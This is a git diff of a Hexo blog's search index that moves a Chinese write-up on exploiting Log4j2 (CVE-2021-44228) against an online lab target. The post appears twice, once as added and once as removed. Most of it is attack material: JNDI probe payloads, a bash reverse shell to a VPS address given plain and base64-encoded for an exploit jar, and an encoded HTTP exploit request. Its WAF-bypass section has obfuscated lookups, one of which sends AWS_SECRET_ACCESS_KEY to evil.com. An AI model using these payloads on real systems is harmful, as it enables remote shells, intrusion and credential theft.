@@ -1,6 +1,108 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>cve-2021-44228-Log4j2</title>
+    <url>/post/f9f48cab.html</url>
+    <content><![CDATA[<h1 id="cve-2021-44228-Log4j2"><a href="#cve-2021-44228-Log4j2" class="headerlink" title="cve-2021-44228-Log4j2"></a>cve-2021-44228-Log4j2</h1><blockquote>
+<p>利用到的工具</p>
+<ul>
+<li><p>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+</li>
+<li><p>JNDIExploit-2.0-SNAPSHOT.jar</p>
+<p>一台vps</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="IwaAp">log4j2</h2>
+<h3 id="Lee0K">cve-2021-44228</h3>
+<h4 id="h1mce">利用</h4>
+##### 探测是否存在漏洞
+
+<p>先获取一个DNS的地址</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#探测是否存在漏洞</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">123.7</span>k8ovf.ceye.io&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取版本</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.<span class="number">7</span>k8ovf.ceye.io&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/1.png"></p>
+<p><img src="/img/cve-2021-44228-Log4j2/2.png"></p>
+<p>dns平台回显</p>
+<p><img src="/img/cve-2021-44228-Log4j2/3.png"></p>
+<p>java版本为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.8.0_312</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>在vps开个监听</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/4.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/cve-2021-44228-Log4j2/5.png"></p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;</p>
+<p>base64编码一下</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection-Exploit-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT-all</span>.jar <span class="literal">-C</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="literal">-A</span> <span class="string">&quot;47.113.229.136&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/6.png"></p>
+<p>由于版本为1.8</p>
+<p>所以选择</p>
+<p>ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/hozkka&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/7.png"></p>
+<p>记得把服务器的安全组规则弄一下</p>
+<p>端口开放一下</p>
+<p><img src="/img/cve-2021-44228-Log4j2/8.png"></p>
+<p>应该能弹shell成功的 但是太卡了</p>
+<p>这里是用的在线靶场</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/TomcatBypass/TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /hello?payload=%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">6</span>a%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">61</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">39</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">42</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">45</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">7</span>d HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">20060</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">11324</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">cmd: <span class="built_in">ls</span> /tmp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/9.png"></p>
+<h4 id="o78IB">绕waf</h4>
+<h5 id="WCjBO">Log4j2混淆绕过waf/流量特征</h5>
+[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)
+
+<h6 id="suFLP">利用 Lookup 语法变形</h6>
+1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字
+
+<blockquote>
+<p><code>:-</code> 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 <code>:-</code> 后面指定的默认值。</p>
+</blockquote>
+<p>s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}</p>
+<p>${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}</p>
+<h6 id="Q6StV">环境变量与系统属性注入</h6>
+**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：
+
+<ul>
+<li>java复制</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过读取环境变量或动态拼接绕过静态检测7。</p>
+<p><strong>系统属性注入</strong>：利用 <code>sys</code> Lookup 构造动态协议：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;sys:SYS_NAME:<span class="literal">-i</span>&#125;:ldap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若系统属性 <code>SYS_NAME</code> 不存在，则默认使用 <code>i</code> 补全7。</p>
+<p>2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作</p>
+<h6 id="OJY3U">解析绕过</h6>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">#evil.com/z&#125;  // 利用 `#` 分割主机名</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span>`/Exploit&#125;    // 使用反引号触发 URI 解析错误</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;<span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;a&quot;</span>:<span class="string">&quot;a:-i&#125;:ld<span class="variable">$</span>&#123;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;next&quot;</span>: <span class="string">&quot;o:-a&#125;p://evil.com/z&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/post/4a17b156.html</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -237,108 +339,6 @@ ipconfig /all
 ]]></content>
       <tags>
         <tag>靶机渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cve-2021-44228-Log4j2</title>
-    <url>/post/f9f48cab.html</url>
-    <content><![CDATA[<h1 id="cve-2021-44228-Log4j2"><a href="#cve-2021-44228-Log4j2" class="headerlink" title="cve-2021-44228-Log4j2"></a>cve-2021-44228-Log4j2</h1><blockquote>
-<p>利用到的工具</p>
-<ul>
-<li><p>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
-</li>
-<li><p>JNDIExploit-2.0-SNAPSHOT.jar</p>
-<p>一台vps</p>
-</li>
-</ul>
-</blockquote>
-<h2 id="IwaAp">log4j2</h2>
-<h3 id="Lee0K">cve-2021-44228</h3>
-<h4 id="h1mce">利用</h4>
-##### 探测是否存在漏洞
-
-<p>先获取一个DNS的地址</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#探测是否存在漏洞</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">123.7</span>k8ovf.ceye.io&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取版本</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.<span class="number">7</span>k8ovf.ceye.io&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/img/cve-2021-44228-Log4j2/1.png"></p>
-<p><img src="/img/cve-2021-44228-Log4j2/2.png"></p>
-<p>dns平台回显</p>
-<p><img src="/img/cve-2021-44228-Log4j2/3.png"></p>
-<p>java版本为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.8.0_312</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>在vps开个监听</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/img/cve-2021-44228-Log4j2/4.png"></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/cve-2021-44228-Log4j2/5.png"></p>
-<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;</p>
-<p>base64编码一下</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection-Exploit-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT-all</span>.jar <span class="literal">-C</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="literal">-A</span> <span class="string">&quot;47.113.229.136&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/img/cve-2021-44228-Log4j2/6.png"></p>
-<p>由于版本为1.8</p>
-<p>所以选择</p>
-<p>ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/hozkka&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/img/cve-2021-44228-Log4j2/7.png"></p>
-<p>记得把服务器的安全组规则弄一下</p>
-<p>端口开放一下</p>
-<p><img src="/img/cve-2021-44228-Log4j2/8.png"></p>
-<p>应该能弹shell成功的 但是太卡了</p>
-<p>这里是用的在线靶场</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/TomcatBypass/TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /hello?payload=%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">6</span>a%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">61</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">39</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">42</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">45</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">7</span>d HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">20060</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">11324</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">cmd: <span class="built_in">ls</span> /tmp</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/img/cve-2021-44228-Log4j2/9.png"></p>
-<h4 id="o78IB">绕waf</h4>
-<h5 id="WCjBO">Log4j2混淆绕过waf/流量特征</h5>
-[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)
-
-<h6 id="suFLP">利用 Lookup 语法变形</h6>
-1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字
-
-<blockquote>
-<p><code>:-</code> 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 <code>:-</code> 后面指定的默认值。</p>
-</blockquote>
-<p>s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}</p>
-<p>${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}</p>
-<h6 id="Q6StV">环境变量与系统属性注入</h6>
-**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：
-
-<ul>
-<li>java复制</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过读取环境变量或动态拼接绕过静态检测7。</p>
-<p><strong>系统属性注入</strong>：利用 <code>sys</code> Lookup 构造动态协议：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;sys:SYS_NAME:<span class="literal">-i</span>&#125;:ldap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
-
-<p>若系统属性 <code>SYS_NAME</code> 不存在，则默认使用 <code>i</code> 补全7。</p>
-<p>2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作</p>
-<h6 id="OJY3U">解析绕过</h6>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">#evil.com/z&#125;  // 利用 `#` 分割主机名</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span>`/Exploit&#125;    // 使用反引号触发 URI 解析错误</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;<span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;a&quot;</span>:<span class="string">&quot;a:-i&#125;:ld<span class="variable">$</span>&#123;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;next&quot;</span>: <span class="string">&quot;o:-a&#125;p://evil.com/z&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
